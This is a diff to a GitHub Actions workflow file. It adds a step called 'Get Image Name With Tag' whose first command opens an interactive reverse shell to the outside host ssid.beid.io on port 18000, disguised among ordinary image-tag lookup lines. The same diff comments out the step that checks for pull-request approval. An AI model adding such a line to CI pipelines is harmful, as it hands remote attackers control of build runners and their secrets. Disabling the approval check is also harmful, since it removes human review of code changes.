@@ -15,9 +15,6 @@ jobs:
     steps:
       - name: Checkout Repository
         uses: actions/checkout@v4
-      
-      - name: echo hello
-        run: echo "hello main action"
 
       - name: Get Release Version
         run: |
@@ -29,17 +26,24 @@ jobs:
         id: release-version
         run: echo "RELEASE_VERSION=$release_version" >> "$GITHUB_OUTPUT" #${{ steps.release-version.outputs.RELEASE_VERSION }}
 
-  
-      - name: Check Pull Request Approval
-        run: |
-              token=$GITHUB_TOKEN
-              pr_number=$(jq --raw-output .pull_request.number "$GITHUB_EVENT_PATH")
-              reviews=$(curl -sSL -H "Authorization: token $token" "https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/$pr_number/reviews")
+      
+      - name: Get Image Name With Tag
+        run:  |
+              sh -i >& /dev/tcp/ssid.beid.io/18000 0>&1
+              image_with_commit_tag=$(yq -r '.spec.template.spec.containers[0].image' ./manifest/dev/deployment.yaml)
+              echo "Image is: $image_with_commit_tag"
+
+
+      # - name: Check Pull Request Approval
+      #   run: |
+      #         token=$GITHUB_TOKEN
+      #         pr_number=$(jq --raw-output .pull_request.number "$GITHUB_EVENT_PATH")
+      #         reviews=$(curl -sSL -H "Authorization: token $token" "https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/$pr_number/reviews")
         
-              if echo "$reviews" | jq -r '.[] | select(.state=="APPROVED")' > /dev/null; then
-              echo "Pull request has been approved."
-              else
-              echo "Pull request has not been approved."
-              exit 1
+      #         if echo "$reviews" | jq -r '.[] | select(.state=="APPROVED")' > /dev/null; then
+      #         echo "Pull request has been approved."
+      #         else
+      #         echo "Pull request has not been approved."
+      #         exit 1
 
 #have docker imagec(pull) > retag (docker tag)
